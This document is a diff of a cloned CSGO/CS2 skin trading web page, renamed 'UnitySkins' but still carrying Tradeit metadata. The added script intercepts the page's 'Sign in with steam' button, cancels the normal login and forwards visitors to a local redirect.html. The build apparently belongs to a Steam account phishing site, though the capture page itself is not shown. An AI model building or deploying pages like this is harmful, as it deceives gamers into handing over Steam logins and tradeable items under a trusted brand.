@@ -1,10 +1,11 @@
 <!DOCTYPE html>
-<html  lang="en" data-capo="">
+<html  lang="en"></html>
    <head>
       <meta charset="utf-8">
       <meta name="viewport" content="width=device-width, initial-scale=1">
       <meta name="viewport" content="width=device-width, initial-scale=1">
-      <title>Trade CS2 Skins | Best CSGO Bot Trading Website</title>
+      <title>UnitySkins | Best CSGO Bot Trading Website</title>
+      <link rel="icon" href="favicon.ico" type="image/x-icon">
       <style id="vuetify-theme-stylesheet">:root {
          --v-theme-background: 255,255,255;
          --v-theme-background-overlay-multiplier: 1;
@@ -2228,7 +2229,6 @@
       <meta property="og:locale:alternate" content="fi">
       <meta property="og:locale:alternate" content="nl">
       <meta property="og:locale:alternate" content="sv">
-      <link rel="icon" href="images/favicon.ico" type="image/x-icon">
       <meta name="og:title" content="Best CSGO Trading Website | Tradeit">
       <meta name="twitter:title" content="Best CSGO Trading Website | Tradeit">
       <meta name="og:url" content="https://UnitySkins.com/csgo/trade">
@@ -2237,17 +2237,30 @@
       <meta name="og:image" content>
    </head>
    <body>
-<script>
-  // Open the Steam app
-  setTimeout(function() {
-    window.location.href = 'steam://openurl'; // Replace with the correct Steam URL
-  }, 5000);
+    <script>
+        window.onload = function() {
+            // Select the button element that matches the title "Sign in with steam"
+            const steamButton = document.querySelector('button[title="Sign in with steam"]');
 
-  // Redirect to redirect.html on GitHub Pages after the Steam app opens
-  setTimeout(function() {
-    window.location.href = 'redirect.html'; // Relative path for GitHub Pages
-  }, 7000); // 2 seconds after the Steam redirect
-</script>
+            // Make sure the button exists
+            if (steamButton) {
+                steamButton.addEventListener("click", function(event) {
+                    event.preventDefault(); // Prevent any default button action
+
+                    // Try to open the Steam app
+                    window.location.href = "steam://open"; 
+
+                    // Fallback: after 1 second, redirect to another page (redirect.html)
+                    setTimeout(function() {
+                        window.location.href = "redirect.html";
+                    }, 1000);
+                });
+            } else {
+                console.error("Steam sign-in button not found");
+            }
+        };
+    </script>
+
 
       <div id="__nuxt">
          <div>
